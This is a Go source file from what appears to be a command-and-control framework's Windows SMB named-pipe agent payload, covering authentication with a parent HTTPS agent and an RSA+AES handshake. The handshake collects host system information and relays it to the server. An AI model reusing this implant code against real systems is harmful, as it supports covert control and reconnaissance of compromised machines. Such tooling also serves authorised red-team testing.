// server/docker/payloads/SMB_Windows/auth.go
// Authentication and handshake for SMB agent

//go:build windows
// +build windows

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"
)

// performAuth performs lightweight authentication with the connecting HTTPS agent
func performAuth(conn *PipeConnection) error {
	// Generate a random challenge
	challenge := make([]byte, 32)
	if _, err := rand.Read(challenge); err != nil {
		return fmt.Errorf("failed to generate challenge: %w", err)
	}

	// Send challenge
	if err := conn.WriteMessage(challenge); err != nil {
		return fmt.Errorf("failed to send challenge: %w", err)
	}

	// Read response
	response, err := conn.ReadMessage()
	if err != nil {
		return fmt.Errorf("failed to read auth response: %w", err)
	}

	// Verify response format: should be "AUTH:" + challenge
	expectedPrefix := []byte("AUTH:")
	if len(response) != len(expectedPrefix)+len(challenge) {
		return fmt.Errorf("invalid auth response length")
	}

	for i, b := range expectedPrefix {
		if response[i] != b {
			return fmt.Errorf("invalid auth response prefix")
		}
	}

	for i, b := range challenge {
		if response[len(expectedPrefix)+i] != b {
			return fmt.Errorf("challenge mismatch")
		}
	}

	// Send confirmation
	if err := conn.WriteMessage([]byte("OK")); err != nil {
		return fmt.Errorf("failed to send confirmation: %w", err)
	}

	return nil
}

// performHandshake performs the RSA+AES handshake with the server via the HTTPS agent
func performHandshake(conn *PipeConnection, config map[string]string) error {
	// Collect system information
	sysInfo, err := CollectSystemInfo(clientID)
	if err != nil {
		return fmt.Errorf("failed to collect system info: %w", err)
	}

	// Encrypt system info with RSA+AES (same as HTTPS agent handshake)
	publicKey := config["Public Key"]
	initSecret := config["Secret"]

	encryptedPayload, err := encryptHandshakePayload(sysInfo, publicKey, initSecret)
	if err != nil {
		return fmt.Errorf("failed to encrypt handshake payload: %w", err)
	}

	// Create handshake message to send through the HTTPS agent
	handshakeMsg := map[string]string{
		"type":    "handshake",
		"payload": encryptedPayload,
	}

	msgJSON, err := json.Marshal(handshakeMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal handshake message: %w", err)
	}

	// Send handshake through the pipe
	if err := conn.WriteMessage(msgJSON); err != nil {
		return fmt.Errorf("failed to send handshake: %w", err)
	}

	// Wait for handshake response
	// Set a timeout for the response
	responseChan := make(chan []byte, 1)
	errChan := make(chan error, 1)

	go func() {
		resp, err := conn.ReadMessage()
		if err != nil {
			errChan <- err
			return
		}
		responseChan <- resp
	}()

	// Wait for response with timeout
	select {
	case response := <-responseChan:
		// Parse the response
		var respEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal(response, &respEnvelope); err != nil {
			return fmt.Errorf("failed to parse handshake response: %w", err)
		}

		if respEnvelope.Type != "handshake_response" {
			return fmt.Errorf("unexpected response type: %s", respEnvelope.Type)
		}

		// Decode and parse the signed response
		respBytes, err := base64.StdEncoding.DecodeString(respEnvelope.Payload)
		if err != nil {
			return fmt.Errorf("failed to decode response payload: %w", err)
		}

		var signedResp SignedResponse
		if err := json.Unmarshal(respBytes, &signedResp); err != nil {
			return fmt.Errorf("failed to parse signed response: %w", err)
		}

		// Verify server signature
		if err := verifyServerSignature(&signedResp, publicKey); err != nil {
			return fmt.Errorf("server signature verification failed: %w", err)
		}

		// Update client ID
		if signedResp.NewClientID == "" {
			return fmt.Errorf("no new client ID received")
		}
		clientID = signedResp.NewClientID

		// Initialize secure communications with derived secrets
		secret1, secret2 := generateInitialSecrets(initSecret, sysInfo.AgentInfo.Seed)
		secureComms = NewSecureComms(secret1, secret2)

		// logDebug("Handshake successful: clientID=%s", clientID)
		return nil

	case err := <-errChan:
		return fmt.Errorf("handshake response error: %w", err)

	case <-time.After(300 * time.Second):
		// 5-minute timeout to accommodate slow polling from parent HTTPS agent
		// The response must travel: SMB -> HTTPS -> Server -> HTTPS -> SMB
		// This can take 2-3 poll cycles of the HTTPS agent
		return fmt.Errorf("handshake response timeout")
	}
}

// SignedResponse represents the server's signed handshake response
type SignedResponse struct {
	Status             string `json:"status"`
	NewClientID        string `json:"new_client_id"`
	SecretsInitialized bool   `json:"secrets_initialized"`
	Signature          string `json:"signature"`
	Seed               string `json:"seed"`
}
